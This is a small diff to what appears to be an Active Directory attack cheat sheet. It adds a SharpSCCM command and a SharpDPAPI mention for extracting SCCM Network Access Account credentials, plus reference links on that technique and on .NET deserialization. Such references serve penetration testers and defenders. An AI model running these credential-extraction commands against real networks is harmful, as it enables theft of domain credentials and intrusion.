@@ -3663,9 +3663,10 @@ python Exchange2domain.py -ah attackterip -u user -p password -d domain.com -th 
     NetworkAccessPassword : <![CDATA[E600000001...8C6B5]]>
     NetworkAccessUsername : <![CDATA[E600000001...00F92]]>
     ```
-* Using [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI/blob/81e1fcdd44e04cf84ca0085cf5db2be4f7421903/SharpDPAPI/Commands/SCCM.cs#L208-L244) for SCCM retrieval and decryption
+* Using [GhostPack/SharpDPAPI](https://github.com/GhostPack/SharpDPAPI/blob/81e1fcdd44e04cf84ca0085cf5db2be4f7421903/SharpDPAPI/Commands/SCCM.cs#L208-L244) or [Mayyhem/SharpSCCM](https://github.com/Mayyhem/SharpSCCM) for SCCM retrieval and decryption
     ```ps1
     .\SharpDPAPI.exe SCCM
+    .\SharpSCCM.exe get naa -u USERNAME -p PASSWORD
     ```
 * Check ACL for the CIM repository located at `C:\Windows\System32\wbem\Repository\OBJECTS.DATA`:
     ```ps1
@@ -4049,3 +4050,5 @@ CME          10.XXX.XXX.XXX:445 HOSTNAME-01   [+] DOMAIN\COMPUTER$ 31d6cfe0d16ae
 * [A Diamond (Ticket) in the Ruff - By CHARLIE CLARK July 05, 2022](https://www.semperis.com/blog/a-diamond-ticket-in-the-ruff/)
 * [Sapphire tickets - The Hacker Recipes](https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/sapphire)
 * [Exploiting RBCD Using a Normal User Account - tiraniddo.dev - Friday, 13 May 2022](https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html)
+* [Exploring SCCM by Unobfuscating Network Access Accounts - @_xpn_ - Posted on 2022-07-09](https://blog.xpnsec.com/unobfuscating-network-access-accounts/)
+* [.NET Advanced Code Auditing XmlSerializer Deserialization Vulnerability - April 2, 2019 by znlive](https://znlive.com/xmlserializer-deserialization-vulnerability)
